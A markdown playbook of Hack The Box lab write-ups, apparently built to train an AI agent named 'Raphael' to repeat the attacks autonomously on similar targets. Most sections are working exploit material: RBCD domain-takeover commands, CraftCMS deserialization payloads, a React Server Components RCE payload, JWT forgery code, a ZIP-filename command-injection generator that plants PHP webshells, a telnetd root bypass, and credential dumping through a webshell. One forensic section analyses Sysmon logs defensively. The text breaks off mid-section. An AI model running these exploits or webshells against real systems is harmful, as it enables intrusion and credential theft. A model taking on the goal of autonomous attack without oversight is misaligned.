# Raphael 2.0 — Practical PWN Methodology & Training

## Overview

This document stores real HTB engagement methodologies for training Raphael's
model routing, tool selection, and exploitation reasoning. Each entry records:

- Target profile (OS, domain, services)
- Enumeration chain and key findings
- Exploitation steps and tools used
- Privilege escalation path
- Analogies / reusable patterns

By ingesting these records, Raphael should learn to recognise attack patterns
and replicate them autonomously on similar targets.

---

## ENGAGEMENT 001 — Support (Easy Windows)

### Target Profile
- **IP:** 10.129.51.253
- **OS:** Windows Server 2022 (Domain Controller)
- **Domain:** support.htb
- **Hostnames:** dc.support.htb, support.htb
- **Key Ports:** 445 (SMB), 389/636 (LDAP/LDAPS), 5985 (WinRM)

### Enumeration Chain

| Step | Action | Command / Tool | Finding |
|------|--------|----------------|---------|
| 1 | Anonymous SMB share list | `smbclient -N -L //<IP>/` | Found `support-tools` (non-default share) |
| 2 | SMB share access | `smbclient -N //<IP>/support-tools` | 7-Zip, Putty, Wireshark, UserInfo.exe.zip |
| 3 | Download UserInfo.exe | `get UserInfo.exe.zip` | .NET executable |
| 4 | Decompile .NET binary | `monodis --userstrings UserInfo.exe` | Found XOR-encrypted password + key `armando` |
| 5 | XOR decryption | `base64 decode → XOR with key → XOR with 0xDF` | LDAP creds: `ldap@support.htb:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` |
| 6 | LDAP search | `ldapsearch -H ldap://support.htb -D "ldap@support.htb" -w '<pwd>' -b "dc=support,dc=htb" "(objectClass=user)"` | `support` user has `info: Ironside47pleasure40Watchful` |
| 7 | WinRM connect | `evil-winrm -i <IP> -u support -p 'Ironside47pleasure40Watchful'` | User shell on DC |

### Foothold Credentials
- **User:** `support`
- **Password:** `Ironside47pleasure40Watchful`
- **Domain:** SUPPORT.HTB

### Privilege Escalation: RBCD (Resource-Based Constrained Delegation)

| Step | Action | Tool | Finding |
|------|--------|------|---------|
| 1 | Check MachineAccountQuota | `Get-ADObject` | Quota = 10 (users can add 10 computers) |
| 2 | Check group membership | `whoami /groups` | `support` is in `Shared Support Accounts` |
| 3 | Verify GenericAll on DC | BloodHound / `Get-ADComputer DC -Properties PrincipalsAllowedToDelegateToAccount` | Empty — ready for RBCD |
| 4 | Add fake computer | `addcomputer.py -computer-name 'FAKE-COMP01$' -computer-pass 'Password123'` | Success |
| 5 | Set RBCD on DC | `rbcd.py -action write -delegate-to 'DC$' -delegate-from 'FAKE-COMP01$'` | Delegation rights modified |
| 6 | Request ticket | `getST.py -spn cifs/dc.support.htb -impersonate administrator 'SUPPORT.HTB/FAKE-COMP01$:Password123'` | Saved `administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache` |
| 7 | SYSTEM shell | `KRB5CCNAME=ticket.ccache psexec.py -k -no-pass support.htb/administrator@dc.support.htb` | `nt authority\system` |

### Analogies & Reusable Patterns

**Pattern 1: SMB Anonymous Access → Credential Disclosure**
- Always check for non-default SMB shares with null/anonymous auth
- Look for `.exe`, `.zip`, `.ps1` files — they often contain embedded creds
- For .NET binaries: `monodis --strings` reveals hardcoded strings the C# source

**Pattern 2: LDAP as Reconnaissance Vector**
- Stolen LDAP creds let you query the entire domain object tree
- Check the `info` attribute on user objects — it's often used for password storage
- `memberOf` reveals group membership for privilege escalation planning

**Pattern 3: From Domain User to DC via RBCD**
- RBCD requires 3 conditions:
  1. `ms-DS-MachineAccountQuota > 0` (default is 10)
  2. Current user is in `Authenticated Users` (always true)
  3. Current user/group has `GenericAll`/`WriteDACL` on target computer
- `addcomputer.py + rbcd.py + getST.py` is the standard RBCD toolkit from Linux
- After getting a ccache file, use `psexec.py -k` or `smbclient.py -k`

**Pattern 4: WinRM Connectivity**
- Always check port 5985 (HTTP) before 5986 (HTTPS)
- `negotiate` transport works when `ntlm` fails
- Ruby's `winrm` gem or `evil-winrm.rb` work well from Kali/Linux

---

## ENGAGEMENT 002 — [Next Target]

### Target Profile
- **IP:** TBD
- **OS:** TBD
- **Domain:** TBD

### Enumeration Chain
| Step | Action | Finding |
|------|--------|---------|
| 1 | | |

### Foothold
...

### Privilege Escalation
...

### Analogies
...

---

## Training Notes for Raphael

When Raphael encounters a target:

1. **Start with SMB** — List shares anonymously. Non-default shares are gold.
2. **If .NET binaries found** — Extract and decompile for hardcoded creds.
3. **If LDAP creds found** — Dump entire domain user/group tree.
4. **Check info/description** fields for passwords.
5. **For privilege escalation on DCs** — Always check MachineAccountQuota + RBCD path.
6. **Always keep a Kerberos ccache** — It enables SMB, WinRM, and PSExec.

---

## ENGAGEMENT 002 — Orion (Medium Linux)

### Target Profile
- **IP:** 10.129.53.83
- **OS:** Linux (Ubuntu 22.04, nginx 1.18.0, PHP 8.2.30)
- **HTB VPN:** 10.10.15.184/23
- **CraftCMS 5.6.16** on Yii2 2.0.x
- **Domain:** orion.htb
- **Open Ports:** 22 (SSH), 80 (HTTP)

### Vulnerability: CVE-2025-32432 (CraftCMS Pre-Auth Object Injection)
- **Type:** PHP deserialization via Image Transform handler
- **Endpoint:** `POST /index.php?p=actions/assets/generate-transform`
- **Auth:** None required (CSRF token obtainable from `/admin/login`)
- **Mechanism:** Malicious `handle` JSON with injected `as session` behavior triggers arbitrary class instantiation.
  Internally, Craft's `ImageTransform::__construct()` processes the JSON via `Yii::configure()`, which uses `Component::__set()`.
  The `__class` key triggers Yii2 container's `createObject()` to instantiate arbitrary classes — this is the Yii2 CVE-2024-58136 part.

### RCE Gadget Chains

**1. FnStream (GuzzleHttp) — PHP info leak (PRIMARY reliable method):**
```json
{
  "assetId": 11,
  "handle": {
    "width": 123, "height": 123,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "GuzzleHttp\\Psr7\\FnStream",
      "__construct()": [[]],
      "_fn_close": "phpinfo"
    }
  }
}
```
- Returns full phpinfo page — output survives Yii error handler because FnStream's `__destruct` runs `call_user_func($this->_fn_close)` AFTER the error page has been committed.
- **CRITICAL: `$_ENV` / `$_SERVER` in phpinfo shows ALL env vars, including DB credentials from `.env`** — this is the most reliable way to exfiltrate data without needing session injection.

**2. PhpManager (yii\\rbac) — Arbitrary file include:**
```json
{
  "assetId": 11,
  "handle": {
    "width": 1, "height": 1,
    "as session": {
      "class": "craft\\behaviors\\FieldLayoutBehavior",
      "__class": "yii\\rbac\\PhpManager",
      "__construct()": [{"itemFile": "/path/to/file"}]
    }
  }
}
```
- **Both `__class` and `__construct()` use DOUBLE underscore** — NOT single underscore as some walkthroughs state. Single underscore `_class` causes `UnknownPropertyException`.
- The `itemFile` is passed to PhpManager constructor, and PhpManager's `init()` calls `load()` which does `require($this->itemFile)`.
- The `require` treats file content as PHP — anything outside `<?php ?>` is output as text.
- Use cases: include error log (leaks creds), include `.env` (shows config as text), include access log.

### Exfiltration Challenges (CRITICAL)

- **Yii error handler** calls `ob_end_clean()` in a loop — ALL buffered output from `echo`/`print`/`system()` is discarded before the error page renders.
- **FnStream's `phpinfo()`** survives because it runs post-response via destructor. **This is the ONLY reliable output mechanism.**
- **`die()` / `exit()` does NOT help** — PHP's shutdown sequence still triggers the error handler.
- **Session injection via `a=<?php...?>` is BLOCKED** on this target — Craft CMS strips `<?` from the `a` parameter before storing in the session. The `?>` closing tag survives but `<?` is removed, preventing PHP execution from session files.
- **`returnUrl` parameter** is NOT stored in the session on this target (only `a` is stored, and it's sanitized).
- **`allow_url_include = Off`** — `data://` and `php://input` wrappers don't work with `require()`.
- **`php://filter` chains** only work if the final output is valid PHP (the filter output is executed as code, not data).
- **Nginx access log injection via User-Agent/Referer** requires log flushing — nginx buffers log writes, so immediate inclusion may not see the injected entry. Use the PHP error log at `/var/www/html/craft/storage/logs/phperrors.log` for historical error data.
- **BEST approach:** Use FnStream+phpinfo to read `$_ENV`/`$_SERVER` — all `.env` variables appear there without any execution.

### Full Exploitation Chain (Practical — Verified Working)

1. **Get CSRF token** from `/admin/login`:
   ```python
   r = s.get(f"{TARGET}/admin/login")
   csrf = re.search(r'csrfTokenValue["\']?\s*[:=]\s*["\']([^"\']+)', r.text).group(1)
   ```

2. **Leak DB creds via FnStream phpinfo** — `$_ENV['CRAFT_DB_PASSWORD']` is visible:
   ```python
   # POST with __class=FnStream, _fn_close=phpinfo
   # Response contains phpinfo. Parse <tr><td>$_ENV['CRAFT_DB_PASSWORD']</td>...
   ```
   - DB: `root:SuperSecureCraft123Pass!` on `127.0.0.1:3306`, database `orion`
   - Security key: `RRS86F6i2JQKdC6kfEI7frVxA47WVMx8`

3. **Query MySQL** for user hashes — either via phpinfo exfil or direct MySQL query if port exposed:
   ```sql
   SELECT id, username, password FROM users
   ```
   - Returns bcrypt hash for `admin` and `adam` users.

4. **Crack bcrypt hash** with `hashcat -m 3200` + `rockyou.txt` → password: `darkangel`

5. **SSH as adam:**
   ```bash
   ssh adam@orion.htb  # password: darkangel
   ```
   - User flag: `/home/adam/user.txt` → `280e56be1d80457b45177c5b94ac98ff`

6. **Privesc via telnetd** — inetd listens on 127.0.0.1:23:
   ```bash
   USER="-f root" telnet -a 127.0.0.1
   ```
   - The `USER` env var is read by the telnet client and sent as the login username.
   - `-f root` is interpreted by telnetd as "force login as root without password".
   - Python script for scripted access:
   ```python
   import subprocess, os, time
   os.environ["USER"] = "-f root"
   p = subprocess.Popen(["/usr/bin/telnet", "-a", "127.0.0.1"],
       stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
   time.sleep(2)
   p.stdin.write(b"cat /root/root.txt\n")
   p.stdin.flush()
   p.stdin.write(b"exit\n")
   out = p.stdout.read().decode(errors="ignore")
   ```
   - Root flag: `/root/root.txt` → `37a54a4fabe2d23ca29cfbf6ea87bf77`

### Key Nuances Discovered During Live Exploitation

- **FnStream works with ANY assetId** — even assetId 1 works despite returning 404/400 for non-exploit requests.
- **`__class` must be double underscore** for both FnStream and PhpManager gadgets. Single underscore `_class` hits `UnknownPropertyException` on `FieldLayoutBehavior`.
- **Craft CMS strips `<?` from `a` parameter** on this target — session injection is not viable. Don't waste time here.
- **PhpManager require of error log** reveals stack traces with all `$_SERVER` vars including credentials — useful for post-exploitation recon.
- **Access.log inclusion** returns raw log content as text output (~21KB) — shows request history but commands are URL-encoded.
- **SSH works immediately** if you have the hash/password — MySQL is localhost-only so you must either crack locally or inject MySQL query via PHP execution.

### Exfiltration Decision Tree

1. Need creds? → **FnStream + phpinfo** (fastest, most reliable)
2. Need file read? → **PhpManager** require `/var/www/html/craft/storage/logs/phperrors.log` (contains historical env dumps with creds)
3. Need RCE? → **Session injection BLOCKED** — try PhpManager with error log include + log poisoning via error trigger
4. Need MySQL query? → SSH with cracked creds, or PhpManager require a PHP file that contains query code

### Analogies / Reusable Patterns

- **CMS RCE → phpinfo → env vars → DB creds** — skip session injection entirely, phpinfo leaks everything
- **FnStream `_fn_close` as one-shot zero-arg function call**:
  - `"phpinfo"` — dump all config/env/server vars (MOST USEFUL)
  - `"phpcredits"` — PHP credits page
  - No other zero-arg function gives useful output
- **PhpManager `require` as arbitrary file include gadget**:
  - Cannot pass arguments to the included file
  - File content is executed as PHP — raw text is output
  - Log files contain historical data with credentials
- **`__class` / `__construct()` double underscore** is the correct syntax for BOTH gadgets (not single underscore)
- **`call_user_func` with single string argument** — only useful for zero-argument functions like `phpinfo()`
- **Yii error handler kills output** — `ob_end_clean()` in a loop. Only FnStream destructor runs after this.
- **telnetd `-f` flag privesc** — `USER="-f root" telnet -a 127.0.0.1` bypasses auth on inetd-based telnetd
- **No writable webroot** on this target — can't upload webshell. Use SSH for persistent access.

---

## ENGAGEMENT 003 — React Oops (Very Easy Web)

### Target Profile
- **Live:** `http://154.57.164.81:32184`
- **OS:** Linux (Node 20 Alpine, Docker)
- **Stack:** Next.js 16.0.6, React 19, App Router, standalone build
- **Challenge name:** `react2shell` (from package.json)

### Vulnerability: CVE-2025-55182 (React2Shell — Critical RCE in React Server Components)
- **Type:** Prototype pollution via RSC Flight protocol deserialization
- **CVSS:** 10.0 (Critical)
- **Root cause:** Missing `hasOwnProperty` check in RSC Flight reply deserializer — `$1:__proto__:then` traverses the prototype chain to manipulate `Chunk.prototype.then`

### Exploitation Chain

| Step | Action | Detail |
|------|--------|--------|
| 1 | Identify Next.js version | `X-Powered-By: Next.js`, `Vary: rsc, next-router-state-tree` headers; bundle chunks in `/_next/static/chunks/` |
| 2 | Send crafted multipart POST | `POST /` with `Next-Action: x` header and custom multipart body containing the RSC Flight reply payload |
| 3 | Prototype chain traversal | `"then":"$1:__proto__:then"` creates a fake thenable on `Object.prototype` via Chunk reference |
| 4 | Function constructor access | `"_formData":{"get":"$1:constructor:constructor"}` reaches JavaScript's `Function` constructor |
| 5 | Code execution in `_prefix` | Arbitrary JS in `_prefix` executes server-side via the Blob deserialization path |
| 6 | Exfiltrate via digest | `throw Object.assign(new Error(...), {digest: output})` returns output in the response `digest` field |

### Key Payload Structure
```python
part0_value = '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,'
              '"value":"{\\"then\\":\\"$B1337\\"}",'
              '"_response":{"_prefix":"ARBITRARY_JS_CODE","_chunks":"$Q2",'
              '"_formData":{"get":"$1:constructor:constructor"}}}'
```

### Flag Output
Reading `/app/flag.txt` via `global.process.mainModule.require('fs').readFileSync('/app/flag.txt')`:
```
HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
```

### Analogies / Reusable Patterns

**Pattern 1: Detect Next.js + RSC**
- Headers: `Vary: rsc`, `Next-Action`, `x-nextjs-prerender`
- Client bundles reveal framework version in chunk hashes
- `package.json` / source ZIP may hint at vulnerability name ("react2shell")

**Pattern 2: RSC Flight Protocol Exploitation**
- Server processes `$1:__proto__:then` as a prototype chain traversal — this is the core of CVE-2025-55182
- The multipart body is sent to the server's Reply deserializer (not the Response deserializer)
- `$@` syntax creates lazy Chunk references; `$B` creates raw byte chunks
- Three fields needed: main payload, chunk reference (`"$@0"`), hints array (`[]`)

**Pattern 3: Production Error Digest Exfiltration**
- Next.js production hashes error messages to numeric digests
- Bypass: `throw Object.assign(new Error('...'), {digest: data})` — the `digest` property on the thrown object is returned verbatim
- This works because Next.js error serialisation reads `error.digest` before falling back to hashing

**Pattern 4: RCE via Built-in Modules**
- `global.process.mainModule.require('fs')` — access filesystem directly
- `global.process.mainModule.require('child_process')` — shell commands
- The `require` path differs from normal Node.js because the code runs in React's bundled scope

---

## ENGAGEMENT 004 — OpenSecret (Very Easy Web)

### Target Profile
- **Live:** `http://154.57.164.72:31994`
- **Stack:** Express (Node.js), plain HTML/CSS frontend
- **Type:** Help desk support portal with JWT-based session management

### Vulnerability: Hardcoded JWT Secret in Client-Side Source

| Step | Action | Detail |
|------|--------|--------|
| 1 | View homepage source | `view-source:http://TARGET/` |
| 2 | Locate SECRET_KEY | `const SECRET_KEY = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}";` declared in inline `<script>` |
| 3 | Understand JWT generation | Client-side `generateJWT()` creates tokens with `alg:HS256` using `crypto.subtle.sign` |
| 4 | Forge admin JWT | Reimplement HMAC-SHA256 signing with the exposed secret, set `username: "admin"` |
| 5 | Access protected endpoint | `GET /tickets` with forged cookie `session_token=<JWT>` |
| 6 | Read flag in ticket | Admin ticket #3 contains: `Master access key for emergency recovery: HTB{...}` |

### Key Payload
```python
header = {"alg": "HS256", "typ": "JWT"}
payload = {"username": "admin"}
# Sign with HMAC-SHA256 using known key
token = base64url(json.dumps(header)) + "." + base64url(json.dumps(payload))
sig = hmac.new(SECRET_KEY.encode(), token.encode(), hashlib.sha256).digest()
token += "." + base64url(sig)
```

### Flag
```
HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}
```

### Analogies / Reusable Patterns

**Pattern 1: Client-Side Secrets Are Not Secrets**
- Always check `view-source` for hardcoded API keys, JWT secrets, or credentials
- Look in inline `<script>` blocks and static JS files
- JWT secrets in frontend code enable full token forgery — create any username/role

**Pattern 2: JWT Algorithm Confusion**
- Check if the server accepts `alg: none` (algorithm confusion attack)
- The exposed secret enables symmetric (HS256) verification — even if the server expects RS256
- Forge tokens with `admin` or other privileged usernames

**Pattern 3: Standard Pattern for Protected Endpoints**
- `/tickets` returns 401 without auth — indicates JWT-protected route
- `submit-ticket` endpoint exists without auth (creates tickets)
- Admin tickets/posts/comments often contain sensitive data or flags

---

## ENGAGEMENT 005 — Unit42 (Very Easy Sherlock)

### Target Profile
- **Provided artifact:** `Microsoft-Windows-Sysmon-Operational.evtx` (1.1 MB, 169 events)
- **Scenario:** UltraVNC backdoor campaign (Palo Alto Unit42 research)
- **Zip password:** `hacktheblue`
- **Compression:** Method 99 (encrypted ZIP), extracted with `7z x -p"hacktheblue"`

### Analysis Methodology

| Sysmon Event ID | Use Case |
|----------------|----------|
| 1 (Process Creation) | Track malicious process execution chain |
| 2 (File Creation Time Changed) | Detect Time Stomping / defense evasion |
| 3 (Network Connection) | Identify C2 or exfiltration destinations |
| 5 (Process Termination) | Find when malware exits after infection |
| 11 (File Created) | Map all dropped files |
| 22 (DNS Query) | Track domain lookups |

### Key Findings

| Task | Question | Answer |
|------|----------|--------|
| 1 | Count of Event ID 11 | `56` |
| 2 | Malicious process path | `C:\Users\CyberJunkie\Downloads\Preventivo24.02.14.exe.exe` |
| 3 | Cloud drive used | `Dropbox` (queries to `dl.dropboxusercontent.com` / `d.dropbox.com`) |
| 4 | Timestamp changed for PDF | `2024-01-14 08:10:06` (Time Stomped to appear older) |
| 5 | `once.cmd` full path | `C:\Users\CyberJunkie\AppData\Roaming\Photo and Fax Vn\Photo and vn 1.1.2\install\F97891C\WindowsVolume\Games\once.cmd` |
| 6 | Dummy domain for internet check | `www.example.com` |
| 7 | Outbound IP connection | `93.184.216.34` (TCP port 80) |
| 8 | Process termination time | `2024-02-14 03:41:58` |

### Event Chain Summary
1. **Firefox** (browser) queries `dl.dropboxusercontent.com` — user downloads `Preventivo24.02.14.exe.exe` from Dropbox
2. **explorer.exe** spawns `Preventivo24.02.14.exe.exe` — user double-clicked the file (Rule: `T1204 - User Execution`)
3. The malware drops UltraVNC components under `%APPDATA%\Photo and Fax Vn\...\WindowsVolume\Games\`
4. MSI installer runs via `msiexec.exe` — signed binary proxy execution (T1218)
5. Multiple files are Time Stomped (Event ID 2) — PDF changed to `2024-01-14` to blend in (T1070.006)
6. `once.cmd` dropped to `...\Games\once.cmd`
7. Network connection to `93.184.216.34:80` (T1036 - Masquerading via RuleName)
8. DNS query to `www.example.com` — internet connectivity check
9. Process terminates at `03:41:58.799` — infection complete, UltraVNC backdoor installed

### Analogies / Reusable Patterns

**Pattern 1: Sysmon Event Analysis for Malware Infection**
- Event ID 1 shows the parent->child process chain: `explorer.exe` → `*.exe.exe` (user execution)
- Event ID 11 × 56 files created → high indicator of a dropper/extraction
- Event ID 22 with `www.example.com` = standard connectivity check (also `google.com`, `microsoft.com`)
- Event ID 2 with changes to `CreationUtcTime` = Time Stomping (T1070.006)

**Pattern 2: Standard Infection Kill Chain via Sysmon**
- Download (Event ID 22 → Cloud domain)
- User execution (Event ID 1 → explorer.exe spawns malware)
- Dropper writes files (Event ID 11 × N)
- Time Stomping (Event ID 2 × N)
- C2 beacon (Event ID 3 → outbound TCP)
- Cleanup/self-termination (Event ID 5)

**Pattern 3: UltraVNC Backdoor Indicators**
- `UVncVirtualDisplay.dll`, `UltraVNC.ini`, `vnchooks.dll`, `viewer.exe` — UltraVNC component files
- Dropped under `WindowsVolume\Games\` as a masquerading location
- MSI installer pattern: malware drops `.msi` files that install via `msiexec.exe /i`

**Pattern 4: Tools & Workflow**
- `7z x archive.zip -p"password"` for encrypted HTB evidence ZIPs
- `python-evtx` library (`Evtx.Evtx` module) for parsing EVTX files on Linux
- XML field extraction via regex on `<Data Name="FIELD">VALUE</Data>` patterns
- For large logs, `evtx_dump` or `evtx_dump_json` CLI tools exist in the python-evtx package
- Correlation key: match `ProcessGuid` across events to trace the infection flow

---

## ENGAGEMENT 006 — Enigma (Easy Linux)

### Target Profile
- **IP:** 10.129.239.191
- **OS:** Ubuntu Linux (kernel 6.x)
- **HTB VPN Tun IP (attacker):** 10.10.15.184
- **Key Ports:** 22 (SSH/publickey-only), 80 (nginx), 110/143/993/995 (Dovecot mail stack), 2049 (NFS), 111 (rpcbind), additional high RPC ports
- **Domains:** `enigma.htb`, `mail001.enigma.htb`, `support_001.enigma.htb`
- **Stack:** nginx 1.24.0, OpenSTAManager 2.9.8 (PHP 8.3), MySQL 8.x, Dovecot, Roundcube 1.6.16, OliveTin 3000.10.0 (Go binary running as root)
- **Difficulty:** Easy
- **Tags:** `nfs` `imap` `password-reuse` `cve-2025-69212` `openstamanager` `zip-injection` `mysql` `bcrypt` `hashcat` `olivetin` `cve-2026-27626` `grpc-web` `pexpect` `su`

### Tools Required on Attacker Machine

| Tool | Purpose | Installation |
|------|---------|-------------|
| `nmap` | Port scanning | `apt install nmap` |
| `showmount` | NFS export enumeration | Part of `nfs-common` package |
| `mount -t nfs` | Mount NFS shares | Part of `nfs-common` package |
| `pdftotext` | Extract text from PDF | `apt install poppler-utils` |
| `curl` | HTTP/IMAP requests, uploads | Built-in |
| `hashcat` | bcrypt password cracking | `apt install hashcat` or download from hashcat.net |
| `rockyou.txt` | Wordlist for cracking | `apt install wordlist-rockyou` or download |
| `python3` with `pexpect` | Interactive `su` via PTY | `pip install pexpect` (pre-installed on target in this case) |
| `zipfile` (Python) | Create malicious ZIP payloads | Built-in Python module |
| `base64` | Encode payloads for injection | Built-in |
| `jq` | Parse JSON responses (optional) | `apt install jq` |

### Enumeration Chain (Detailed)

#### Step 1 — Reconnaissance

**Add vhosts to /etc/hosts:**
```bash
echo "10.129.239.191 enigma.htb mail001.enigma.htb support_001.enigma.htb" | sudo tee -a /etc/hosts
```

**Initial port scan (all ports):**
```bash
nmap -p- --min-rate 5000 -sV -sC 10.129.239.191 -oN nmap_all.txt
```

Key findings:
```
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu (publickey only)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
110/tcp   open  pop3     Dovecot pop3d
111/tcp   open  rpcbind  2-4 (RPC #100000)
143/tcp   open  imap     Dovecot imapd
993/tcp   open  ssl/imap Dovecot imapd
995/tcp   open  ssl/pop3 Dovecot pop3d
2049/tcp  open  nfs_acl  3 (RPC #100227)
```

The SSH-only-publickey constraint means password-based login is blocked. NFS on 2049 is the first priority.

#### Step 2 — NFS Share Enumeration

**List NFS exports:**
```bash
showmount -e 10.129.239.191
```
```
Export list for 10.129.239.191:
/srv/nfs/onboarding *
```

The `*` means world-readable — no authentication required.

**Mount the share locally:**
```bash
sudo mkdir -p /mnt/nfs
sudo mount -t nfs -o vers=3,nolock 10.129.239.191:/srv/nfs/onboarding /mnt/nfs
ls -la /mnt/nfs
# -rw-r--r-- 1 root root 1751 ... New_Employee_Access.pdf
```

**Extract credentials from PDF:**
```bash
pdftotext /mnt/nfs/New_Employee_Access.pdf -
```
```
Employee : Kevin Mitchell
Webmail  : http://mail001.enigma.htb
Username : kevin
Password : Enigma2024!
```

**First credential pair:** `kevin:Enigma2024!`

#### Step 3 — IMAP/Webmail Pivot

The corporate password default `Enigma2024!` is reused across accounts. Access kevin's mailbox, then try the same password on other accounts.

**IMAP via curl (no web UI needed):**
```bash
# List kevin's mailboxes
curl -s --url "imaps://10.129.239.191/" --user "kevin:Enigma2024!" -k
# * LIST (...) "/" Sent / Trash / INBOX

# Read kevin's inbox (MAILINDEX=1)
curl -s --url "imaps://10.129.239.191/INBOX/;MAILINDEX=1" --user "kevin:Enigma2024!" -k
```
Kevin's email is a welcome message from `sarah@enigma.htb` (Accounts department). This reveals the second user.

**Try same password on sarah:**
```bash
curl -s --url "imaps://10.129.239.191/" --user "sarah:Enigma2024!" -k
# Success — password reuse confirmed
```

**Read sarah's inbox:**
```bash
curl -s --url "imaps://10.129.239.191/INBOX/;MAILINDEX=1" --user "sarah:Enigma2024!" -k
```
Sarah's email contains IT support credentials for an internal ticketing system:
```
Subject : Re: OpenSTAManager Access Request
URL     : http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

**Second credential pair:** `admin:Ne3s4rtars78s` on `support_001.enigma.htb`

#### Step 4 — Web Application Reconnaissance

OpenSTAManager (open source management / invoicing software) is running on `support_001.enigma.htb`. Login page confirms v2.9.8.

**Login with curl:**
```bash
curl -c /tmp/osm.cookie -X POST 'http://support_001.enigma.htb/?op=login' \
  -d 'username=admin&password=Ne3s4rtars78s' -L
```

Check version in footer/app — version 2.9.8 is vulnerable to CVE-2025-69212.

### Foothold: CVE-2025-69212 (ZIP Filename Injection RCE)

#### Vulnerability Mechanism

The file `src/Util/XML.php` at line 100 calls:
```php
exec('openssl smime -verify -in "' . $file . '" ...');
```

When a ZIP is uploaded via the `importFE_ZIP` plugin, the archive is extracted and `.p7m` files are passed to `decodeP7M()`. The filename comes from the ZIP entry — user-controlled. PHP's `ZipArchive` only splits on `/` (path separator), so `"`, `;`, `$()`, backticks etc. pass through into the shell.

**Goal:** Break out of the `-in "..."` context:
```
exec("openssl ... -in \"fileName.p7m\";INJECTED_COMMAND;echo \".p7m\" ...")
```
becomes:
```
exec("openssl ... -in \"fileName.p7m\"; INJECTED_COMMAND; echo \".p7m\" ...")
```

**Constraint:** No `/` allowed in the ZIP filename (ZipArchive treats it as directory separator). Workaround: use `base64` to encode the command, or `cd` to change to the target directory first.

#### Step 1 — Generate the Malicious ZIP

**Python payload generator (`gen_payload.py`):**
```python
#!/usr/bin/env python3
import zipfile, io, sys, base64

cmd_to_exec = sys.argv[1] if len(sys.argv) > 1 else 'id'

# Base64-encode the command to avoid / in the filename
b64 = base64.b64encode(cmd_to_exec.encode()).decode()

# The filename: break out of exec() context with " and ;
# echo B64 | base64 -d | sh  → decodes and executes the command
zip_payload = 'echo ' + b64 + ' | base64 -d | sh'
filename = 'x.p7m";' + zip_payload + ';echo ".p7m'

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as zf:
    zf.writestr(filename, b'<xml/>')
with open('payload.zip', 'wb') as f:
    f.write(buf.getvalue())
print(f'Payload ZIP created: {filename[:60]}...')
```

**Usage:** `python3 gen_payload.py "cd files; echo '<?php system(\$_GET[0]);?>' > SHELL.php"`

#### Step 2 — Upload the ZIP

**Upload to the correct endpoint:**
```bash
# The plugin endpoint, NOT actions.php with id_module/id_plugin
curl -b /tmp/osm.cookie -X POST \
  'http://support_001.enigma.htb/plugins/importFE_ZIP/actions.php' \
  -F 'blob1=@payload.zip;type=application/zip' \
  -F 'op=save'
```

**Expected response:** HTTP 200 with JSON `{"id":1}` followed by an HTML error page about XML parsing (500-style). The 500 error is **expected** — the shell command executed BEFORE the XML parser tried to read the fake `.p7m` content. The XML parsing failure is irrelevant.

#### Step 3 — Webshell Deployment and Verification

**For webshell:**
```bash
python3 gen_payload.py "cd files; echo '<?php system(\$_GET[\"c\"]); ?>' > SHELL.php"
curl -b /tmp/osm.cookie -X POST \
  'http://support_001.enigma.htb/plugins/importFE_ZIP/actions.php' \
  -F 'blob1=@payload.zip;type=application/zip' \
  -F 'op=save'
```

**Verify RCE:**
```bash
curl 'http://support_001.enigma.htb/files/SHELL.php?c=id'
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Step 4 — Persistent Webshell at Known Path

The `/files/SHELL.php` path works but can be ephemeral. Deploy a more accessible webshell at `/var/www/html/openstamanager/shell.php`:

```bash
python3 gen_payload.py "echo '<?php system(\$_GET[0]);?>' > /var/www/html/openstamanager/shell.php"
```

**This gives us:** `http://support_001.enigma.htb/shell.php?c=CMD` as a reliable command execution channel. All subsequent steps use this URL.

#### Important Implementation Notes

| Issue | Observation | Workaround |
|-------|------------|------------|
| ZIP injection reliability | `&&`, `|`, piping sometimes fails | Use `base64` encoding to avoid `/` and special chars |
| `actions.php` vs plugin | Main `actions.php` with `id_module=14&id_plugin=48` gives HTTP 500 before command runs | Use `plugins/importFE_ZIP/actions.php` directly. The `blob1` field carries the ZIP |
| Command length limit | Long commands in ZIP filenames get truncated | Keep payloads under ~200 chars; use base64 decoding for complex commands |
| PHP webshell persistence | Shell may be deleted on ZIP operations | Write to `/var/www/html/openstamanager/shell.php` (not under `/files/`) |

### Lateral Movement: www-data → haris

#### Step 1 — Extract MySQL Database Credentials

**Read OpenSTAManager config:**
```bash
curl -s 'http://support_001.enigma.htb/shell.php?c=cat%20/var/www/html/openstamanager/config.inc.php'
```

**Key lines:**
```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

**Third credential pair:** `brollin:Fri3nds@9099` (MySQL)

#### Step 2 — Dump Password Hashes from MySQL

PHP `mysqli` is available on the target. Write a PHP script to query the database:

**Via webshell — write the PHP one-liner:**
```bash
# Write db_dump.php via printf through the webshell
curl -s 'http://support_001.enigma.htb/shell.php?c=printf%20%27%3C%3Fphp%0A%24db%20%3D%20new%20mysqli%28%22localhost%22%2C%20%22brollin%22%2C%20%22Fri3nds%409099%22%2C%20%22openstamanager%22%29%3B%0A%24q%20%3D%20%24db-%3Equery%28%22SELECT%20username%2Cpassword%20FROM%20zz_users%22%29%3B%0Awhile%28%24r%20%3D%20%24q-%3Efetch_assoc%28%29%29%20%7B%0A%20%20%20%20echo%20%24r%5B%22username%22%5D%20.%20%22%3A%22%20.%20%24r%5B%22password%22%5D%20.%20%22%5Cn%22%3B%0A%7D%0A%3F%3E%27%20%3E%20/var/www/html/openstamanager/db_dump.php'
```

**Visit the script:**
```bash
curl 'http://support_001.enigma.htb/db_dump.php'
```

**Output:**
```
